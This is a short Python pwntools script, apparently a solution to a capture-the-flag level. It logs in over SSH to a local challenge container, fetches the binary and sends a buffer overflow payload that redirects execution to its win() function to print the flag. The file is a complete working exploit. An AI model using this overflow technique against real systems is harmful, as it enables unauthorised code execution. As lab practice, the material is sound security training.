from pwn import *

#
# SSH
HOST = "localhost"
PORT = 2221
USER = "level1"
PASSWORD = "level1"
REMOTE_BINARY = "./challenge"
LOCAL_COPY = "/tmp/challenge_level1"

# Conexi√≥n SSH
ssh_conn = ssh(user=USER, host=HOST, port=PORT, password=PASSWORD)

# Descargar binario desde contenedor
ssh_conn.download_file(REMOTE_BINARY, LOCAL_COPY)

# direcciones 
elf = ELF(LOCAL_COPY)
win_addr = elf.symbols['win']
main_addr = elf.symbols['main']

log.success(f"win()  = {hex(win_addr)}")
log.success(f"main() = {hex(main_addr)}")

# Construir payload
payload = b"A" * 72
payload += p64(win_addr)
payload += p64(main_addr)

# Ejecutar binario remotamente
p = ssh_conn.process(REMOTE_BINARY)
p.sendlineafter("Welcome to Level 1", payload)

# Leer salida
p.shutdown('send')
sleep(1)
output = p.recvall(timeout=3).decode(errors="ignore")

print("\n==== FLAG OUTPUT ====\n")
print(output)
print("=====================\n")
